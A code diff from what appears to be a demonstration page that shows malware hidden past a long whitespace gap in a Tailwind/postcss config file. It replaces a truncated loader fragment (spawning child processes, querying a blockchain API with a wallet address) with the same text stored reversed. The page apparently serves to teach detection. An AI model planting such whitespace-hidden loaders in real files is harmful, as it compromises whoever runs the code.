@@ -161,7 +161,8 @@
   if (code) {
     var GAP = 9000,
         LEADIN = "};",
-        payload = "global.i=\"A8-…\";global.r=require;const http=require(\"http\"),{spawn}=require(\"child_process\"),S=\"0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a\".toLowerCase(),I=\"https://eth.blockscout.com/api\"… /* truncated */",
+        // the demo payload is stored reversed, so this file carries no live campaign marker
+        payload = "/* detacnurt */ …\"ipa/moc.tuocskcolb.hte//:sptth\"=I,)(esaCrewoLot.\"a1fE0942CDa9e3601210f6e0803D113D3f5E223ax0\"=S,)\"ssecorp_dlihc\"(eriuqer=}nwaps{,)\"ptth\"(eriuqer=ptth tsnoc;eriuqer=r.labolg;\"…-8A\"=i.labolg".split("").reverse().join(""),
         lines = [["1", "module.exports = {"], ["2", "  plugins: {"], ["3", "    '@tailwindcss/postcss': {},"], ["4", "  },"]],
         revealBtn = document.getElementById("reveal"),
         scroller = document.getElementById("scroller"),
